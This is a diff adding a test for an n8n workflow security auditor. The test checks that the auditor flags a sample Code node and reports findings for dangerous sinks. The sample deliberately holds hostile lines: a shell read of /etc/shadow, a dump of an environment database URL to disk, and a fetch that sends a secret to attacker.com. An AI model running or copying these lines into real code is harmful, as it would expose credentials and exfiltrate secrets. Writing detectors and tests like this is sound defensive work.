@@ -575,3 +575,52 @@ test("the Origin is derived from the configured Base URL, not hardcoded", async 
   // Scheme+host+port only — never the path or trailing slash, or the guard rejects it.
   assert.equal(calls[0].headers.Origin, "https://tenant.self-hosted.example:8443");
 });
+
+test("workflowAudit performs AST code scanning detecting dangerous sinks in Code nodes", async () => {
+  const dangerousJs = `
+    const { execSync } = require('child_process');
+    execSync('cat /etc/shadow');
+    const secret = "AKIAIOSFODNN7EXAMPLE";
+    const envVal = process.env.DATABASE_URL;
+    const fs = require('fs');
+    fs.writeFileSync('/tmp/dump.txt', envVal);
+    eval("console.log('eval run')");
+    fetch('https://attacker.com/leak?data=' + secret);
+  `;
+
+  const { safe, flagged } = await run({
+    action: "workflowAudit",
+    params: {
+      workflowJson: JSON.stringify({
+        nodes: [
+          {
+            name: "Risky Worker",
+            type: "n8n-nodes-base.code",
+            parameters: { jsCode: dangerousJs },
+            typeVersion: 2,
+          },
+        ],
+        connections: {},
+      }),
+    },
+    credentials: null,
+  });
+
+  const result = (flagged[0] ?? safe[0]).json;
+  assert.equal(result.operation, "workflowAudit");
+  assert.equal(result.readyForProduction, false);
+
+  const findings = result.findings as Array<Record<string, unknown>>;
+  const findingIds = new Set(findings.map((f) => f.id));
+
+  assert.ok(findingIds.has("n8n.code.command_execution"), "Missing command_execution finding");
+  assert.ok(findingIds.has("n8n.code.arbitrary_evaluation"), "Missing arbitrary_evaluation finding");
+  assert.ok(findingIds.has("n8n.code.hardcoded_secret"), "Missing hardcoded_secret finding");
+  assert.ok(findingIds.has("n8n.code.filesystem_access"), "Missing filesystem_access finding");
+  assert.ok(findingIds.has("n8n.code.env_access"), "Missing env_access finding");
+  assert.ok(findingIds.has("n8n.code.network_egress"), "Missing network_egress finding");
+
+  const cmdFinding = findings.find((f) => f.id === "n8n.code.command_execution");
+  assert.equal(cmdFinding?.severity, "CRITICAL");
+  assert.equal(cmdFinding?.owasp, "LLM05:2025 Improper Output Handling");
+});
